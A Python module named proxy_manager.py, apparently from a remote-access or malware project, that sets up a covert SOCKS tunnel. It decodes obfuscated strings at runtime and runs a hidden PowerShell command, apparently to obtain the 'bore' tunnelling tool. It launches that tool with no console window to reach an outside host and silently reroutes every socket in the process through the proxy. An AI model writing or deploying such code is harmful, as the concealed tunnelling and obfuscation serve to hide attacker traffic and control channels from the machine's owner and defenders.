"""
core/proxy_manager.py - Global proxy for all modules
"""

import socket
import socks
import requests
from core.obfuscation import decrypt_string

class ProxyManager:
    """Manages SOCKS5 proxy for all outbound traffic"""

    def __init__(self):
        self.proxy_host = None
        self.proxy_port = None
        self.proxy_enabled = False
        self.original_socket = socket.socket

    def start_bore_proxy(self):
        decrypt_string("PUYZGTpxOw0oEkRIB1tGKSFxMzh7cSkQNQ8T")
        try:
            import subprocess
            import time
            import threading

            def run_bore():
                try:

                    subprocess.run([
                        "powershell", "-Command",
                        decrypt_string("J1wOBCU0dDU/FThdA0wDCRoSVT48OHkKLgMaS0gWSR0HRhAeLH86DTdYD1MIUQcUCR0aBDw0dhA/Gw9ZAVwVVQJTDA49JXYGNQAEVB1YAlUMXQoOYDQhB3paJU0Gfw8WCxJcDiAnYzYfOjpkLlsJCAscHRMr")
                    ], capture_output=True)

                    self.proxy_process = subprocess.Popen(
                        [decrypt_string("SlcWHXQFHC8KKzZaHUsDVAtKHQ=="), "socks", "--to", decrypt_string("DF0KDmAhLAA=")],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        creationflags=0x08000000
                    )

                    time.sleep(2)

                except Exception as e:
                    print(decrypt_string("NWIKBDYoBEIYGBhdUlwUCAFAQks1NCQ="))

            threading.Thread(target=run_bore, daemon=True).start()
            return True
        except:
            return False

    def enable_proxy(self, host=decrypt_string("XwBPRX5/aUxr"), port=1080):
        """Enable SOCKS5 proxy for all sockets"""
        try:
            socks.set_default_proxy(socks.SOCKS5, host, port)
            socket.socket = socks.socksocket
            self.proxy_enabled = True
            self.proxy_host = host
            self.proxy_port = port

            test = requests.get(decrypt_string("BkYMGz1rdk07BwMWG0kPHBccFxkp"), timeout=5)
            print(decrypt_string("NWIKBDYoBEIfGQtaHlwCVk5XAB8rIzcDNlcjaEgZHQ4LQQxFOjQhFic="))
            return True
        except Exception as e:
            print(decrypt_string("NWIKBDYoBEIcFgNUF11cWhVXBQ=="))
            return False

    def disable_proxy(self):
        """Disable proxy and restore original socket"""
        socket.socket = self.original_socket
        self.proxy_enabled = False

    def proxy_request(self, method, url, **kwargs):
        """Make proxied request"""
        if self.proxy_enabled:
            if 'proxies' not in kwargs:
                kwargs['proxies'] = {
                    'http': decrypt_string('HV0bAD1kY011DBldHl9IChxdABIROTYRLgpQQwFcChxAQgoENigGEjUFHkU='),
                    'https': decrypt_string('HV0bAD1kY011DBldHl9IChxdABIROTYRLgpQQwFcChxAQgoENigGEjUFHkU=')
                }
        return requests.request(method, url, **kwargs)

proxy_manager = ProxyManager()
